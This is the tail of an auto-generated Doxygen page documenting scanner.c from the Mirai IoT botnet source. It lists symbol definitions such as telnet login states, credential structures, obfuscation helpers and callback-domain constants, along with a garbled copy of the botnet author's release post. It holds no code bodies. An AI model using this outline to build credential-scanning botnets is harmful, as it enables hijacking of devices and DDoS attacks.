<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae5782b466533ce6bdb7ac486e0d4f4b1"><div class="ttname"><a href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">scanner_connection::rdbuf</a></div><div class="ttdeci">char rdbuf[SCANNER_RDBUF_SIZE]</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00044">scanner.h:44</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a8654e276185a2f53935614d38f4117f3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a></div><div class="ttdeci">void util_memcpy(void *dst, void *src, int len)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00072">util.c:72</a></div></div>
<div class="ttc" id="resolv_8c_html_afddedcd192860f219d5bc41b48de7055"><div class="ttname"><a href="resolv_8c.html#afddedcd192860f219d5bc41b48de7055">resolv_entries_free</a></div><div class="ttdeci">void resolv_entries_free(struct resolv_entries *entries)</div><div class="ttdef"><b>Definition:</b> <a href="resolv_8c_source.html#l00230">resolv.c:230</a></div></div>
<div class="ttc" id="table_8h_html_a61681f81c214ba8539ebd133b4eaaa35"><div class="ttname"><a href="table_8h.html#a61681f81c214ba8539ebd133b4eaaa35">TABLE_SCAN_CB_PORT</a></div><div class="ttdeci">#define TABLE_SCAN_CB_PORT</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00037">table.h:37</a></div></div>
<div class="ttc" id="table_8h_html_a577985acedbf4e923d0fb33980a3ed0d"><div class="ttname"><a href="table_8h.html#a577985acedbf4e923d0fb33980a3ed0d">TABLE_SCAN_ENABLE</a></div><div class="ttdeci">#define TABLE_SCAN_ENABLE</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00039">table.h:39</a></div></div>
<div class="ttc" id="structscanner__connection_html_ad4ebee7d3f91bebc38fe22523b599735"><div class="ttname"><a href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">scanner_connection::state</a></div><div class="ttdeci">enum scanner_connection::@3 state</div></div>
<div class="ttc" id="scanner_8h_html_ae5695e717c0094f9c301920bbb4215b0"><div class="ttname"><a href="scanner_8h.html#ae5695e717c0094f9c301920bbb4215b0">SCANNER_RAW_PPS</a></div><div class="ttdeci">#define SCANNER_RAW_PPS</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00012">scanner.h:12</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfae53fa3b34bf74719c85bdff3b7988228"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfae53fa3b34bf74719c85bdff3b7988228">scanner_connection::SC_WAITING_USERNAME</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00032">scanner.h:32</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfac7c328e0bf6ed4b6e5b3db001d8edb4f"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfac7c328e0bf6ed4b6e5b3db001d8edb4f">scanner_connection::SC_WAITING_SH_RESP</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00038">scanner.h:38</a></div></div>
<div class="ttc" id="structresolv__entries_html"><div class="ttname"><a href="structresolv__entries.html">resolv_entries</a></div><div class="ttdef"><b>Definition:</b> <a href="resolv_8h_source.html#l00005">resolv.h:5</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">scanner_connection::SC_CLOSED</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00029">scanner.h:29</a></div></div>
<div class="ttc" id="scanner_8h_html"><div class="ttname"><a href="scanner_8h.html">scanner.h</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfa45d35ca60e95088a30afde0284b0b404"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa45d35ca60e95088a30afde0284b0b404">scanner_connection::SC_WAITING_TOKEN_RESP</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00039">scanner.h:39</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfa7cf97e275b1f362c925bbbca8879cb19"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa7cf97e275b1f362c925bbbca8879cb19">scanner_connection::SC_WAITING_PASSWORD</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00033">scanner.h:33</a></div></div>
<div class="ttc" id="scanner_8h_html_ab4d05f6f50d6ff26552bfcc373527659"><div class="ttname"><a href="scanner_8h.html#ab4d05f6f50d6ff26552bfcc373527659">setup_connection</a></div><div class="ttdeci">static void setup_connection(struct scanner_connection *)</div></div>
<div class="ttc" id="scanner_8h_html_a82f55fd3cba4786206af43f82d84e92d"><div class="ttname"><a href="scanner_8h.html#a82f55fd3cba4786206af43f82d84e92d">deobf</a></div><div class="ttdeci">static char * deobf(char *, int *)</div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_a31dbe0466c76698ccd7b518deec33c7c"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#a31dbe0466c76698ccd7b518deec33c7c">INET_ADDR</a></div><div class="ttdeci">#define INET_ADDR(o1, o2, o3, o4)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00018">includes.h:18</a></div></div>
<div class="ttc" id="table_8h_html_a573abc111267f05189a98e4745fc8e60"><div class="ttname"><a href="table_8h.html#a573abc111267f05189a98e4745fc8e60">TABLE_SCAN_QUERY</a></div><div class="ttdeci">#define TABLE_SCAN_QUERY</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00042">table.h:42</a></div></div>
<div class="ttc" id="rand_8c_html_ab74192959d5c945feaf0a630b58fd123"><div class="ttname"><a href="rand_8c.html#ab74192959d5c945feaf0a630b58fd123">rand_init</a></div><div class="ttdeci">void rand_init(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00013">rand.c:13</a></div></div>
<div class="ttc" id="structscanner__connection_html_a6d48d3c152bef1b9c072ab3fdffcb285"><div class="ttname"><a href="structscanner__connection.html#a6d48d3c152bef1b9c072ab3fdffcb285">scanner_connection::tries</a></div><div class="ttdeci">uint8_t tries</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00045">scanner.h:45</a></div></div>
<div class="ttc" id="structresolv__entries_html_ae8dc7d2d70c332fd5d30a18790e88d07"><div class="ttname"><a href="structresolv__entries.html#ae8dc7d2d70c332fd5d30a18790e88d07">resolv_entries::addrs_len</a></div><div class="ttdeci">uint8_t addrs_len</div><div class="ttdef"><b>Definition:</b> <a href="resolv_8h_source.html#l00006">resolv.h:6</a></div></div>
<div class="ttc" id="scanner_8h_html_a001f7782e8f74809d4ccfa093bc7e01f"><div class="ttname"><a href="scanner_8h.html#a001f7782e8f74809d4ccfa093bc7e01f">SCANNER_RDBUF_SIZE</a></div><div class="ttdeci">#define SCANNER_RDBUF_SIZE</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00015">scanner.h:15</a></div></div>
<div class="ttc" id="table_8h_html"><div class="ttname"><a href="table_8h.html">table.h</a></div></div>
<div class="ttc" id="checksum_8h_html"><div class="ttname"><a href="checksum_8h.html">checksum.h</a></div></div>
<div class="ttc" id="table_8c_html_aa5a64b3cddd9889fca3114b5a87c402e"><div class="ttname"><a href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a></div><div class="ttdeci">void table_unlock_val(uint8_t id)</div><div class="ttdef"><b>Definition:</b> <a href="table_8c_source.html#l00078">table.c:78</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfabd9c83717f558e3753f01bfb62dac260"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfabd9c83717f558e3753f01bfb62dac260">scanner_connection::SC_WAITING_SHELL_RESP</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00037">scanner.h:37</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfac06962b31cf1edfe8def6e3c524903c4"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfac06962b31cf1edfe8def6e3c524903c4">scanner_connection::SC_WAITING_ENABLE_RESP</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00035">scanner.h:35</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_a3eaa76d3cfe977972a9bf87dbc12c50f"><div class="ttname"><a href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a></div><div class="ttdeci">World s Largest Echo CNC source code release Anna When I first go in DDoS I wasn t planning on staying in it long I made my there s lots of eyes looking at IOT so it s time to GTFO I know every skid and their it s their wet dream to have something besides qbot So I have an amazing release for you With I usually pull max bots from telnet alone after the Kreb ISPs been slowly shutting down and cleaning up their act max pull is about and dropping I am your and I will treat you real my hf chan And to everyone that thought they were doing anything by hitting my I had good this bot uses domain for CNC It takes seconds for all bots to lol shoutout to this blog post by malwaremustdie thought you were good but you really just completely and totally failed in reversing this binary We still have better kung fu than you kiddos don t make me laugh you made so many mistakes and even confused some different binaries with my LOL Let me give you some slaps back port is not for back connect</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00001">ForumPost.txt:1</a></div></div>
<div class="ttc" id="structscanner__auth_html"><div class="ttname"><a href="structscanner__auth.html">scanner_auth</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00018">scanner.h:18</a></div></div>
<div class="ttc" id="loader_2src_2headers_2util_8h_html_ae46c9b71f57c253f2ba79ce6bd168c4d"><div class="ttname"><a href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a></div><div class="ttdeci">int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2util_8c_source.html#l00111">util.c:111</a></div></div>
<div class="ttc" id="structscanner__auth_html_a57891f0877155a744c8aae3d700bcb0e"><div class="ttname"><a href="structscanner__auth.html#a57891f0877155a744c8aae3d700bcb0e">scanner_auth::username_len</a></div><div class="ttdeci">uint8_t username_len</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00022">scanner.h:22</a></div></div>
<div class="ttc" id="table_8h_html_a4e6214d35394b8de3a0eb9ed3f4d74a5"><div class="ttname"><a href="table_8h.html#a4e6214d35394b8de3a0eb9ed3f4d74a5">TABLE_SCAN_CB_DOMAIN</a></div><div class="ttdeci">#define TABLE_SCAN_CB_DOMAIN</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00036">table.h:36</a></div></div>
<div class="ttc" id="structscanner__connection_html_ae01593a18b7b72016b609c095fec85cfa2cc6e096ce420b903ad8a9704b3f8a3b"><div class="ttname"><a href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa2cc6e096ce420b903ad8a9704b3f8a3b">scanner_connection::SC_WAITING_SYSTEM_RESP</a></div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00036">scanner.h:36</a></div></div>
<div class="ttc" id="connection_8c_html_a7822780437d0519e7c36c8e6a4419f3a"><div class="ttname"><a href="connection_8c.html#a7822780437d0519e7c36c8e6a4419f3a">can_consume</a></div><div class="ttdeci">static BOOL can_consume(struct connection *conn, uint8_t *ptr, int amount)</div><div class="ttdef"><b>Definition:</b> <a href="connection_8c_source.html#l00652">connection.c:652</a></div></div>
<div class="ttc" id="scanner_8h_html_ab511b60a1641bbf457b488b35887a583"><div class="ttname"><a href="scanner_8h.html#ab511b60a1641bbf457b488b35887a583">consume_resp_prompt</a></div><div class="ttdeci">static int consume_resp_prompt(struct scanner_connection *)</div></div>
<div class="ttc" id="structscanner__auth_html_ac1f99c887815fcb29fda89be5efed2c6"><div class="ttname"><a href="structscanner__auth.html#ac1f99c887815fcb29fda89be5efed2c6">scanner_auth::weight_max</a></div><div class="ttdeci">uint16_t weight_max</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00021">scanner.h:21</a></div></div>
<div class="ttc" id="structscanner__connection_html_a83a303fb240fe9aaf0fefa00cfd2ac9b"><div class="ttname"><a href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">scanner_connection::fd</a></div><div class="ttdeci">int fd</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00027">scanner.h:27</a></div></div>
<div class="ttc" id="scanner_8h_html_abe3044a3b818d1ea8d557651f569cf91"><div class="ttname"><a href="scanner_8h.html#abe3044a3b818d1ea8d557651f569cf91">SCANNER_HACK_DRAIN</a></div><div class="ttdeci">#define SCANNER_HACK_DRAIN</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00016">scanner.h:16</a></div></div>
<div class="ttc" id="structscanner__connection_html_aaa8150f776cb2b9c66932501a5d1c5e8"><div class="ttname"><a href="structscanner__connection.html#aaa8150f776cb2b9c66932501a5d1c5e8">scanner_connection::dst_addr</a></div><div class="ttdeci">ipv4_t dst_addr</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00041">scanner.h:41</a></div></div>
<div class="ttc" id="structscanner__connection_html_a926ec8e853c16b6819ddfd89df013097"><div class="ttname"><a href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">scanner_connection::rdbuf_pos</a></div><div class="ttdeci">int rdbuf_pos</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00043">scanner.h:43</a></div></div>
<div class="ttc" id="structscanner__connection_html_a404ba23e26531c9e469151220f2b8c5b"><div class="ttname"><a href="structscanner__connection.html#a404ba23e26531c9e469151220f2b8c5b">scanner_connection::last_recv</a></div><div class="ttdeci">int last_recv</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00027">scanner.h:27</a></div></div>
<div class="ttc" id="scanner_8h_html_a1a530c3cd75361d34847e8c60a95312a"><div class="ttname"><a href="scanner_8h.html#a1a530c3cd75361d34847e8c60a95312a">SCANNER_MAX_CONNS</a></div><div class="ttdeci">#define SCANNER_MAX_CONNS</div><div class="ttdef"><b>Definition:</b> <a href="scanner_8h_source.html#l00011">scanner.h:11</a></div></div>
</div><!-- fragment --></div><!-- contents -->
</div><!-- doc-content -->
<!-- start footer part -->
<div id="nav-path" class="navpath"><!-- id is needed for treeview function! -->
  <ul>
    <li class="navelem"><a class="el" href="dir_526aa88726c618d995900bd3fb6ff493.html">mirai</a></li><li class="navelem"><a class="el" href="dir_fc79afbdad77ef6ec155f6566a92d41a.html">bot</a></li><li class="navelem"><a class="el" href="scanner_8c.html">scanner.c</a></li>
    <li class="footer">Generated by
    <a href="http://www.doxygen.org/index.html">
    <img class="footer" src="doxygen.png" alt="doxygen"/></a> 1.8.11 </li>
  </ul>
</div>
</body>
</html>
